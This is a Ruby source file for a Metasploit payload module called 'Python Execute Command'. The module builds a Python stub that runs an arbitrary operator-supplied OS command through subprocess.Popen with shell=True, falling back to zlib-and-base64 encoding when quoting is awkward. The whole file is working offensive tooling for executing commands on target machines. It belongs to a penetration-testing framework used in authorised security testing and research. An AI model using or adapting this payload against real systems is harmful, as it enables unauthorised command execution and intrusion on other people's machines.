module MetasploitModule
  CachedSize = 248

  include Msf::Payload::Single
  include Msf::Payload::Python

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Python Execute Command',
        'Description' => 'Execute an arbitrary OS command. Compatible with Python 2.7 and 3.4+.',
        'Author' => 'Spencer McIntyre',
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'PayloadType' => 'python',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_options(
      [
        OptString.new('CMD', [ true, 'The command string to execute' ]),
      ]
    )
  end

  def generate(_opts = {})
    super + command_string
  end

  def command_string
    py_code = %(from subprocess import Popen,PIPE\n)

    # try to just use raw strings if nothing would need to be escaped
    if !datastore['CMD'].include?("'")
      py_code << %(args=[r'#{datastore['CMD']}']\n)
    elsif !datastore['CMD'].include?('"')
      py_code << %(args=[r"#{datastore['CMD']}"]\n)
    elsif !datastore['CMD'].include?("'''")
      py_code << %(args=[r'''#{datastore['CMD']}''']\n)
    elsif !datastore['CMD'].include?('"""')
      py_code << %(args=[r"""#{datastore['CMD']}"""]\n)
    else
      encoded = Rex::Text.encode_base64(Rex::Text.zlib_deflate(datastore['CMD']))
      py_code << %{import zlib,base64;args=[zlib.decompress(base64.b64decode('#{encoded}')).decode()]\n}
    end

    py_code << %{Popen(args,shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE)\n}

    py_create_exec_stub(py_code)
  end
end
